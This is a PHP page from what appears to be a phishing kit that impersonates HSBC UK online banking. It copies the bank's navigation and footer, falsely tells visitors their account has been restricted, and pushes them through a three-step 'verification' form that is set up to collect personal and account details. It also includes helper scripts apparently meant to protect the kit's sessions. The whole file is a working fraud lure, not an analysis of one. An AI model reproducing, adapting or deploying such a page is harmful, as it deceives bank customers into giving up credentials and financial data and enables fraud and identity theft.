<?php
/*
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
require "assets/includes/One_Time.php";
?> 
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Verify</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/l33.css" media="screen">
</head>

<body class="l33">
<p style="background-color: #515358;"></p>
<div id="top">
<div id="mainTopWrapper">
<div id="mainTopUtility">
<h1>Personal</h1>

<div id="mainTopUtilityRow">
<ul id="tabs">
<li class="skipLink"><a class="skip" href="#" lang="en">Skip page header and navigation</a></li>

<li class="on"><a href="#">Personal</a></li>

<li><a href="#">Business</a></li>
</ul>

<div id="siteControls">
<div id="langList">
<ul>
<li class="selected"><a href="#">English</a></li>
</ul>
</div>

<div id="locale" lang="en">
<div lang="en" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite"><a class="dropDownLink trigger" href="#">
<span><span class="flag uk">United Kingdom</span></span></a>
<div class="placeholder"></div>
</div>
</div>

</div>
</div>
</div>

<div id="mainTopNavigation">
<div id="logo"><a href="#"><img src="assets/img/logo.gif" width="138" title="" alt=""></a></div>

<div id="sections" lang="en">
<ul id="topLevel">
<li class="level1"><a href="#" class="mainTopNav"><strong>Everyday banking</strong><br>
Accounts &amp; services</a>
</li>

<li class="level1"><a class="mainTopNav" href="#"><strong>Borrowing</strong><br>
Loans &amp; mortgages</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Investing</strong><br>
Products &amp; analysis</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Insurance</strong><br>
Property &amp; family</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Life events</strong><br>
Help &amp; support</a>
</li>
</ul>
</div>
</div>
</div>


					<p></p>

<div class="pageHeaderBg">
<div class="pageHeading row">
<div class="pageHeadingInner">
<h2>Account Verification</h2>
</div>
</div>
</div>

<p></p>

		<div class="innerPage" id="innerPage">
			<div class="grid_skin">
				<div class="row">
					<div class="grid grid_24">
						<ul class="stepTracker stepCount3 stepProgress" data-dojo-type="hsbcwidget/stepTracker" data-dojo-props="addNumsNoDots: true" id="hsbcwidget_stepTracker_0" lang="en" widgetid="hsbcwidget_stepTracker_0">
							<li class="selected first">
								<a href="#" tabindex="0"><span class="progressNum">1</span>
								<span class="hidden" aria-hidden="true">Current Step: </span>
									About the verification process
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">1</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										<span class="stepSelected" data-nlsid="stepTracker.selected"></span>
									</span>
								</a>
							</li>
							<li>
								<a href="#"><span class="progressNum">2</span>
								<span class="hidden" aria-hidden="true">Next Step: </span>
									Confirm personal details
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">2</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
							<li class="last">
								<a href="#"><span class="progressNum">3</span>
									Confirm account information
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">3</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="row activate">

					<div class="containerStyle01">
						<!-- Main Content Starts -->
						<div class="grid grid_24">
							<div>		
							<div class="questionGroup">				
							<div class="informationBox">
							<div class="row">
							<!-- On Page Error Starts -->
								
							
							<h4>Verification Required</h4>
						
						
							<h3 class="hidden" aria-hidden="true">As you may be aware your account has been restricted in order to safguard your information. We now require you to complete our account verification process in order to restore full access.<br><br></h3>
							<p>
As you may be aware your account has been restricted in order to safguard your information. We now require you to complete our account verification process in order to restore full access.
							</p>
							<p>
This process should only take you a few minutes to complete, we apologise for any inconvenience this may have caused however we must take these security measures to protect our customers accounts.
							</p>							
							</div>
								<br><br><br>
							</div>
							</div>
						</div>
							<form action="Step1.php" method="post">

								<div class="buttonRow row">
									<div class="right">
										<div class="button primary primaryBtn">
											<span class="buttonInner"> <input class="submit_input" type="submit" autocomplete="off" value="Continue">
											</span>
										</div>
									</div>
								</div>
							</form>
						</div>


					</div>
				</div>
				<!-- Main Content Ends -->
			</div>
		</div>
		<!-- Entity Content Bottom Starts -->
		<div class="containerStyle07" style="padding: 0px;">
			<div class="innerPage">
				<div class="grid_skin">
					<div class="row">
						
					</div>
				</div>
			</div>
		</div>
			

<div dir="ltr" id="footerLinks">
<div id="footerLinksRow">
<ul>
<li class="contact"><a href="#">Contact and Support</a></li>

<li class="branch"><a href="#">Find a branch</a></li>

<li><a href="#" onclick="" title="" alt="">Website feedback</a></li>
</ul>
</div>
</div>

<div dir="ltr" id="footerMap">
<div class="sixCol" id="footerMapRow">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>

<ul>
<li><a href="#">Current accounts</a></li>

<li><a href="#">Saving accounts</a></li>

<li><a href="#">Credit cards</a></li>

<li><a href="#">International services</a></li>

<li><a href="#">Switching to HSBC</a></li>

<li><a href="#">Security centre</a></li>

<li><a href="#">Card support</a></li>

<li><a href="#">Online Banking</a></li>
</ul>
</div>

<div class="column">
<h2>Premium banking</h2>

<ul>
<li><a href="#">HSBC Premier</a></li>

<li><a href="#">HSBC Advance</a></li>

<li><a href="#">HSBC Expat</a></li>

<li><a href="#">HSBC Private Bank</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Borrowing</a></h2>

<ul>
<li><a href="#">Mortgages</a></li>

<li><a href="#">Loans</a></li>

<li><a href="#">Mortgage calculators</a></li>

<li><a href="#">Overdrafts</a></li>

<li><a href="#">Buy to let</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Investing</a></h2>

<ul>
<li><a href="#">Investment products</a></li>

<li><a href="#">Why invest with us?</a></li>

<li><a href="#">News and analysis</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Insurance</a></h2>

<ul>
<li><a href="#">Home insurance</a></li>

<li><a href="#">Travel insurance</a></li>

<li><a href="#">Car insurance</a></li>

<li><a href="#">Premier car insurance</a></li>

<li><a href="#">Life, critical illness &amp;<br>
income cover</a></li>

<li><a href="#">Student insurance</a></li>
</ul>
</div>

<div class="column last">
<h2><a href="#">Planning</a></h2>

<ul>
<li><a href="#">Health &amp; family</a></li>

<li><a href="#">Home &amp; lifestyle</a></li>

<li><a href="#">Work &amp; retirement</a></li>

<li><a href="#">Planning tools</a></li>
</ul>
</div>
</div>
</div>

<div dir="ltr" id="footerUtility">
<div id="footerUtilityRow">
<ul>
<li><a href="#">About HSBC</a></li>

<li><a href="#">Site map</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">Newsroom</a></li>

<li><a href="#">Legal</a></li>

<li><a href="#" title="" class="dnt_no_consent" onclick="" alt="">Cookie Policy</a></li>

<li><a href="#">Accessibility</a></li>

<li><a href="#">Sustainability</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">Careers</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">HSBC Group</a></li>
</ul>

<p>&copy;&nbsp;HSBC Bank plc 2016</p>
</div>
</div>

<div class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent" lang="en" widgetid="countrySelectorContent" style="display: none;">
<div class="tabsNode">
<ul class="regionTabs">
<li class="selected"><a class="europe" data-region="europe" href="#">Europe</a></li>

<li><a class="asiaPacific" data-region="asiaPacific" href="#">Asia-Pacific</a></li>

<li><a class="middleEast" data-region="middleEast" href="#">Middle East &amp; Africa</a></li>

<li><a class="americas" data-region="americas" href="#">Americas</a></li>
</ul>
</div>

<div class="regions">
<div aria-hidden="false" class="region activeRegion" id="europe">
<h2 style=" display: none;">Europe</h2>

<div class="navList">
<ul class="nav">
<li class="multiTop"><a href="#" title="" class="am" lang="en-GB" onclick="" alt="">Armenia</a></li>

<li class="multiBottom"><a href="#" title="" lang="hy-AM" onclick="" alt="">Հայաստան</a></li>

<li class="multiTop"><a href="#" title="" class="cz" lang="cs-CZ" onclick="" alt="">Czech Republic</a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Česká republika</a></li>

<li class="multiTop"><a href="#" title="" class="fr" lang="en-GB" onclick="" alt="">France <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="fr-FR" onclick="" alt="">France <span>(Français)</span></a></li>

<li><a href="#" title="" class="de" lang="en-GB" onclick="" alt="">Germany</a></li>

<li class="multiTop"><a href="#" title="" class="gr" lang="en-GB" onclick="" alt="">Greece</a></li>

<li class="multiBottom"><a href="#" title="" lang="el-GR" onclick="" alt="">Ελλάδα</a></li>

<li class="last"><a href="#" title="" class="gg" lang="en-GB" onclick="" alt="">Guernsey</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="hu" lang="hu-HU" onclick="" alt="">Hungary</a></li>

<li><a href="#" title="" class="ie" lang="en-IE" onclick="" alt="">Ireland</a></li>

<li><a href="#" title="" class="im" lang="en-GB" onclick="" alt="">Isle of Man</a></li>

<li><a href="#" title="" class="je" lang="en-GB" onclick="" alt="">Jersey</a></li>

<li class="multiTop"><a href="#" title="" class="kz" lang="en-GB" onclick="" alt="">Kazakhstan</a></li>

<li class="multiMiddle"><a href="#" title="" lang="kk-KZ" onclick="" alt="">Қазақстан</a></li>

<li class="multiBottom"><a href="#" title="" lang="ru-RU" onclick="" alt="">Казахстан</a></li>

<li><a href="#" title="" class="mt" lang="en-GB" onclick="" alt="">Malta</a></li>

<li class="multiTop"><a href="#" title="" class="pl" lang="en-GB" onclick="" alt="">Poland</a></li>

<li class="last multiBottom"><a href="#" title="" lang="pl-PL" onclick="" alt="">Polska</a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="ru" lang="en-GB" onclick="" alt="">Russia</a></li>

<li class="multiBottom"><a href="#" title="" lang="ru-RU" onclick="" alt="">Россия</a></li>

<li class="multiTop"><a href="#" title="" class="sk" lang="en-GB" onclick="" alt="">Slovakia</a></li>

<li class="multiBottom"><a href="#" title="" lang="sk-SK" onclick="" alt="">Slovensko</a></li>

<li class="multiTop"><a href="#" title="" class="es" lang="es-ES" onclick="" alt="">Spain</a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">España</a></li>

<li><a href="#" title="" class="ch" lang="en-GB" onclick="" alt="">Switzerland</a></li>

<li class="multiTop"><a href="#" title="" class="tr" lang="en-GB" onclick="" alt="">Turkey</a></li>

<li class="multiBottom"><a href="#" title="" lang="tr-TR" onclick="" alt="">Türkiye</a></li>

<li class="last"><a href="#" title="" class="uk" lang="en-GB" onclick="" alt="">United Kingdom</a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="asiaPacific" style=" display: none;">
<h2 style=" display: none;">Asia-Pacific</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="au" lang="en-AU" onclick="" alt="">Australia</a></li>

<li><a href="#" title="" class="bd" lang="en-GB" onclick="" alt="">Bangladesh</a></li>

<li><a href="#" title="" class="bn" lang="en-GB" onclick="" alt="">Brunei Darussalam</a></li>

<li class="multiTop"><a href="#" title="" class="cn" lang="en-GB" onclick="" alt="">China</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">中国</a></li>

<li class="multiTop"><a href="#" title="" class="hk" lang="en-GB" onclick="" alt="">Hong Kong</a></li>

<li class="multiMiddle"><a href="#" title="" lang="zh-HK" onclick="" alt="">香港<span>（繁體中文）</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">香港<span>（简体中文）</span></a></li>

<li class="multiTop"><a href="#" title="" class="id" lang="en-GB" onclick="" alt="">Indonesia <span>(English)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="id-ID" onclick="" alt="">Indonesia <span>(Bahasa Indonesia)</span></a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="in" lang="en-GB" onclick="" alt="">India</a></li>

<li class="multiTop"><a href="#" title="" class="jp" lang="en-GB" onclick="" alt="">Japan</a></li>

<li class="multiBottom"><a href="#" title="" lang="ja-JP" onclick="" alt="">日本</a></li>

<li class="multiTop"><a href="#" title="" class="kr" lang="en-GB" onclick="" alt="">Korea</a></li>

<li class="multiBottom"><a href="#" title="" lang="ko-KR" onclick="" alt="">한국</a></li>

<li class="multiTop"><a href="#" title="" class="mo" lang="en-GB" onclick="" alt="">Macau</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-MO" onclick="" alt="">澳門</a></li>

<li><a href="#" title="" class="my" lang="en-GB" onclick="" alt="">Malaysia</a></li>

<li><a href="#" title="" class="mv" lang="en-GB" onclick="" alt="">Maldives</a></li>

<li class="last"><a href="#" title="" class="nz" lang="en-NZ" onclick="" alt="">New Zealand</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="pk" lang="en-GB" onclick="" alt="">Pakistan</a></li>

<li><a href="#" title="" class="ph" lang="en-PH" onclick="" alt="">Philippines</a></li>

<li><a href="#" title="" class="sg" lang="en-GB" onclick="" alt="">Singapore</a></li>

<li><a href="#" title="" class="lk" lang="en-GB" onclick="" alt="">Sri Lanka</a></li>

<li class="multiTop"><a href="#" title="" class="tw" lang="en-GB" onclick="" alt="">Taiwan</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-TW" onclick="" alt="">台灣</a></li>

<li class="multiTop"><a href="#" title="" class="th" lang="en-GB" onclick="" alt="">Thailand</a></li>

<li class="multiBottom"><a href="#" title="" lang="th-TH" onclick="" alt="">ประเทศไทย</a></li>

<li class="multiTop"><a href="#" title="" class="vn" lang="en-GB" onclick="" alt="">Vietnam</a></li>

<li class="last multiBottom"><a href="#" title="" lang="vi-VN" onclick="" alt="">Việt Nam</a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="middleEast" style=" display: none;">
<h2 style=" display: none;">Middle East &amp; Africa</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="dz" lang="fr-FR" onclick="" alt="">Algeria</a></li>

<li class="multiTop"><a href="#" title="" class="bh" lang="en-GB" onclick="" alt="">Bahrain <span>(Conventional)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Bahrain <span>(Islamic Amanah)</span></a></li>

<li><a href="#" title="" class="eg" lang="en-GB" onclick="" alt="">Egypt</a></li>

<li><a href="#" title="" class="jo" lang="en-GB" onclick="" alt="">Jordan</a></li>

<li><a href="#" title="" class="kw" lang="en-GB" onclick="" alt="">Kuwait</a></li>

<li><a href="#" title="" class="lb" lang="en-GB" onclick="" alt="">Lebanon</a></li>

<li class="last"><a href="#" title="" class="mu" lang="en-GB" onclick="" alt="">Mauritius</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="om" lang="en-GB" onclick="" alt="">Oman</a></li>

<li class="multiTop"><a href="#" title="" class="qa" lang="en-GB" onclick="" alt="">Qatar <span>(Conventional)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Qatar <span>(Islamic Amanah)</span></a></li>

<li><a href="#" title="" class="sa" lang="en-GB" onclick="" alt="">Saudi Arabia</a></li>

<li><a href="#" title="" lang="ar-SA" onclick="" alt="">السعودية</a></li>

<li><a href="#" title="" class="za" lang="en-ZA" onclick="" alt="">South Africa</a></li>

<li class="multiTop"><a href="#" title="" class="ae" lang="en-GB" onclick="" alt="">United Arab Emirates <span>(Conventional)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">United Arab Emirates <span>(Islamic Amanah)</span></a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="americas" style=" display: none;">
<h2 style=" display: none;">Americas</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="ar" lang="es-AR" onclick="" alt="">Argentina</a></li>

<li><a href="#" title="" class="bm" lang="en-US" onclick="" alt="">Bermuda</a></li>

<li class="multiTop"><a href="#" title="" class="br" lang="en-US" onclick="" alt="">Brazil <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="pt-BR" onclick="" alt="">Brasil <span>(Português)</span></a></li>

<li class="multiTop"><a href="#" title="" class="ca" lang="en-CA" onclick="" alt="">Canada <span>(English)</span></a></li>

<li class="multiMiddle"><a href="#" title="" lang="fr-CA" onclick="" alt="">Canada <span>(Français)</span></a></li>

<li class="multiMiddle"><a href="#" title="" lang="zh-HK" onclick="" alt="">加拿大<span>（繁體中文）</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">加拿大<span>（简体中文）</span></a></li>

<li class="last"><a href="#" title="" class="ky" lang="en-US" onclick="" alt="">Cayman Islands</a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="cl" lang="en-US" onclick="" alt="">Chile <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-CL" onclick="" alt="">Chile <span>(Español)</span></a></li>

<li class="multiTop"><a href="#" title="" class="co" lang="en-US" onclick="" alt="">Colombia <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-CO" onclick="" alt="">Colombia <span>(Español)</span></a></li>

<li><a href="#" title="" class="cr" lang="es-CR" onclick="" alt="">Costa Rica</a></li>

<li><a href="#" title="" class="sv" lang="es-SV" onclick="" alt="">El Salvador</a></li>

<li><a href="#" title="" class="hn" lang="es-HN" onclick="" alt="">Honduras</a></li>

<li class="multiTop"><a href="#" title="" class="mx" lang="en-US" onclick="" alt="">Mexico <span>(English)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="es-MX" onclick="" alt="">México <span>(Español)</span></a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="pa" lang="en-US" onclick="" alt="">Panama <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-PA" onclick="" alt="">Panamá <span>(Español)</span></a></li>

<li class="multiTop"><a href="#" title="" class="py" lang="en-US" onclick="" alt="">Paraguay <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-PY" onclick="" alt="">Paraguay <span>(Español)</span></a></li>

<li><a href="#" title="" class="pe" lang="es-PE" onclick="" alt="">Perú</a></li>

<li><a href="#" title="" class="us" lang="en-US" onclick="" alt="">United States</a></li>

<li class="last"><a href="#" title="" class="uy" lang="es-UY" onclick="" alt="">Uruguay</a></li>
</ul>
</div>
</div>
</div>
</div>


		<!-- Footer Section Ends -->
	</div>



</body></html>